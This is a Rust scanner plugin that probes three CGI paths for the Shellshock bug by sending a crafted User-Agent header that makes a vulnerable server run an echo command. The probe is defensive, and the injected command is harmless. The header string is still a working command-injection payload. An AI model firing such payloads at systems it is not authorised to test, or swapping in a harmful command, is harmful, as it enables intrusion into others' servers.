/*
 * http-shellshock-2 (Rust) - Shellshock probe against three CGI paths.
 * Faithful port of http-shellshock-2.c.
 * Use only on networks you own or have permission to scan.
 */
#![allow(dead_code, non_snake_case, non_upper_case_globals)]

include!("alscript.rs");

fn run(ctx: &AlScriptContext) -> i32 {
    if !ar_valid(ctx) {
        return 1;
    }
    let paths = ["/cgi-bin/test.cgi", "/cgi-bin/status", "/cgi-bin/admin.cgi"];
    let extra = "User-Agent: () { :;}; echo; /bin/echo ALMAP_SHELLSHOCK\r\n";
    let mut found = 0;
    for p in paths.iter() {
        if let Some(resp) = ar_http_request(ctx, "GET", p, extra, None, None) {
            if !resp.is_empty() && ar_contains_ci(&String::from_utf8_lossy(&resp), "ALMAP_SHELLSHOCK") {
                ar_append(ctx, &format!("{}{}", if found == 0 { "VULNERABLE: " } else { ", " }, p));
                found += 1;
            }
        }
    }
    if found == 0 {
        ar_out(ctx, "not vulnerable: Shellshock");
    }
    0
}

#[no_mangle]
pub extern "C" fn almap_script_run(ctx: *mut AlScriptContext) -> i32 {
    if ctx.is_null() {
        return 1;
    }
    let ctx: &AlScriptContext = unsafe { &*ctx };
    run(ctx)
}
